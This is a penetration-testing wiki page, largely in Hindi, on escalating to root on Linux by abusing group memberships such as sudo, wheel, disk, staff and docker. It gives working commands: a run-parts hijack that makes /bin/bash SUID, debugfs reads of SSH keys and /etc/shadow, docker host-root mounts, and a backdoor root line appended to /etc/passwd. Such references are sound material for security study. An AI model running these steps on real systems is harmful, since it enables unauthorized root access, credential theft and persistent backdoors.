# दिलचस्प समूह - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Admin समूह

### **PE - Method 1**

**कभी-कभी**, **डिफ़ॉल्ट रूप से (या क्योंकि कुछ सॉफ्टवेयर को इसकी ज़रूरत होती है)** आप **/etc/sudoers** फ़ाइल के अंदर इनमें से कुछ लाइनों को पा सकते हैं:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
इसका मतलब है कि **कोई भी user जो group sudo या admin का हिस्सा है, sudo के रूप में किसी भी चीज़ को execute कर सकता है**।

यदि ऐसा है, तो **root बनने के लिए आप बस निम्नलिखित execute कर सकते हैं**:
```
sudo su
```
### PE - Method 2

सभी suid binaries खोजें और जाँच करें कि क्या binary **Pkexec** मौजूद है:
```bash
find / -perm -4000 2>/dev/null
```
यदि आप पाते हैं कि बाइनरी **pkexec is a SUID binary** है और आप **sudo** या **admin** के सदस्य हैं, तो आप संभवतः `pkexec` का उपयोग करके बाइनरीज़ को sudo के रूप में चला सकते हैं।\
यह इसलिए है क्योंकि आमतौर पर ये **polkit policy** के अंदर के समूह होते हैं। यह policy मूलतः तय करती है कि कौन से समूह `pkexec` का उपयोग कर सकते हैं। इसे जाँचें:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
वहां आप देखेंगे कि किन समूहों को **pkexec** चलाने की अनुमति है और कुछ linux डिस्ट्रो में **डिफ़ॉल्ट रूप से** समूह **sudo** और **admin** दिखाई देते हैं।

root बनने के लिए आप **निम्नलिखित चला सकते हैं**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
यदि आप **pkexec** को निष्पादित करने का प्रयास करते हैं और आपको यह **error** मिलता है:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**यह इसलिए नहीं है कि आपके पास permissions नहीं हैं, बल्कि इसलिए है कि आप GUI के बिना जुड़े हुए नहीं हैं**. और इस समस्या के लिए समाधान यहाँ है: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). आपको **2 अलग-अलग ssh sessions** चाहिए:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## व्हील समूह

**कभी-कभी**, **डिफ़ॉल्ट रूप से**, **/etc/sudoers** फ़ाइल के अंदर आपको यह पंक्ति मिल सकती है:
```
%wheel	ALL=(ALL:ALL) ALL
```
इसका मतलब यह है कि **कोई भी उपयोगकर्ता जो wheel समूह का सदस्य है, sudo के रूप में किसी भी चीज़ को निष्पादित कर सकता है**।

यदि ऐसा है, तो **root बनने के लिए आप बस निम्नलिखित कमांड चला सकते हैं**:
```
sudo su
```
## Shadow Group

**group shadow** के उपयोगकर्ता **/etc/shadow** फ़ाइल को **पढ़** सकते हैं:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
So, फ़ाइल पढ़ें और कोशिश करें **crack some hashes**.

Quick lock-state nuance when triaging hashes:
- Entries with `!` or `*` are generally non-interactive for password logins.
- `!hash` usually means a password was set and then locked.
- `*` usually means no valid password hash was ever set.
This is useful for account classification even when direct login is blocked.

## Staff Group

**staff**: उपयोगकर्ताओं को सिस्टम में स्थानीय संशोधन (`/usr/local`) जोड़ने की अनुमति देता है बिना root privileges की आवश्यकता के (ध्यान दें कि `/usr/local/bin` में executables किसी भी उपयोगकर्ता के PATH वैरिएबल में होते हैं, और वे उसी नाम के `/bin` और `/usr/bin` के executables को "override" कर सकते हैं). Compare with group "adm", which is more related to monitoring/security. [\[source\]](https://wiki.debian.org/SystemGroups)

In debian distributions, `$PATH` variable show that `/usr/local/` will be run as the highest priority, whether you are a privileged user or not.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
यदि हम `/usr/local` में कुछ प्रोग्राम hijack कर सकें, तो हम आसानी से root प्राप्त कर सकते हैं।

Hijack `run-parts` प्रोग्राम root प्राप्त करने का आसान तरीका है, क्योंकि अधिकांश प्रोग्राम `run-parts` जैसे चलाए जाते हैं (जैसे crontab, जब ssh से लॉगिन किया जाता है)।
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
या जब एक नया ssh session लॉग इन करे।
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Disk समूह

यह विशेषाधिकार लगभग **root access के बराबर** है क्योंकि आप मशीन के अंदर मौजूद सभी डेटा तक पहुँच सकते हैं।

फ़ाइलें:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
ध्यान दें कि debugfs का उपयोग करके आप **write files** भी कर सकते हैं। उदाहरण के लिए `/tmp/asd1.txt` को `/tmp/asd2.txt` में कॉपी करने के लिए आप यह कर सकते हैं:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
हालाँकि, यदि आप **root के स्वामित्व वाली फाइलें लिखने** की कोशिश करते हैं (जैसे `/etc/shadow` या `/etc/passwd`) तो आपको "**Permission denied**" त्रुटि मिलेगी।

## वीडियो समूह

`w` कमांड का उपयोग करके आप यह पता कर सकते हैं कि **कौन सिस्टम पर लॉग इन है** और यह निम्नलिखित जैसा आउटपुट दिखाएगा:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
यह **tty1** दर्शाता है कि उपयोगकर्ता **yossi भौतिक रूप से लॉग इन है** मशीन पर एक टर्मिनल में।

**video group** को स्क्रीन आउटपुट देखने की पहुँच है। बुनियादी तौर पर आप स्क्रीन को देख सकते हैं। इसके लिए आपको raw data के रूप में **स्क्रीन की वर्तमान छवि निकालनी** और स्क्रीन द्वारा उपयोग किए जा रहे रिज़ॉल्यूशन को प्राप्त करना होगा। स्क्रीन डेटा `/dev/fb0` में सहेजा जा सकता है और आप इस स्क्रीन का रिज़ॉल्यूशन `/sys/class/graphics/fb0/virtual_size` पर पा सकते हैं।
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
To **open** the **raw image** you can use **GIMP**, select the **`screen.raw`** file and select as file type **Raw image data**:

![](<../../../images/image (463).png>)

Then modify the Width and Height to the ones used on the screen and check different Image Types (and select the one that shows better the screen):

![](<../../../images/image (317).png>)

## रूट ग्रुप

ऐसा लगता है कि डिफ़ॉल्ट रूप से **root समूह के सदस्य** कुछ **service** configuration फ़ाइलें या कुछ **libraries** फ़ाइलें या **अन्य रोचक चीज़ें** संशोधित करने की पहुँच रख सकते हैं, जिन्हें अधिकार बढ़ाने के लिए इस्तेमाल किया जा सकता है...

**जाँचें कि root सदस्य कौन-सी फ़ाइलें संशोधित कर सकते हैं**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Group

आप **होस्ट मशीन के root filesystem को किसी instance के volume पर mount** कर सकते हैं, इसलिए जब instance शुरू होता है तो वह तुरंत उस volume में `chroot` लोड कर देता है। इससे प्रभावी रूप से आपको मशीन पर root मिल जाता है।
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Finally, if you don't like any of the suggestions of before, or they aren't working for some reason (docker api firewall?) you could always try to **run a privileged container and escape from it** as explained here:


{{#ref}}
../container-security/
{{#endref}}

If you have write permissions over the docker socket read [**this post about how to escalate privileges abusing the docker socket**](../index.html#writable-docker-socket)**.**


{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}


{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Group


{{#ref}}
./
{{#endref}}

## Adm Group

आमतौर पर **members** of the group **`adm`** को _/var/log/_ के अंदर स्थित लॉग फ़ाइलें **read log** करने की permissions होती हैं।\
Therefore, अगर आपने इस समूह के किसी user को compromise कर लिया है तो आपको निश्चित रूप से लॉग्स पर एक **look to the logs** डालना चाहिए।

## Backup / Operator / lp / Mail groups

These groups are often **credential-discovery** vectors rather than direct root vectors:
- **backup**: archives में configs, keys, DB dumps, या tokens उजागर हो सकते हैं।
- **operator**: platform-specific operational access जो sensitive runtime data को leak कर सकता है।
- **lp**: print queues/spools में document contents हो सकते हैं।
- **mail**: mail spools reset links, OTPs, और internal credentials उजागर कर सकते हैं।

Treat membership here as a high-value data exposure finding and pivot through password/token reuse.

## Auth group

OpenBSD में **auth** group आमतौर पर _**/etc/skey**_ और _**/var/db/yubikey**_ फ़ोल्डरों में लिख सकता है यदि वे उपयोग में हों।\
ये permissions निम्नलिखित exploit के साथ दुरुपयोग किए जा सकते हैं ताकि root तक **escalate privileges** किया जा सके: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{{#include ../../../banners/hacktricks-training.md}}
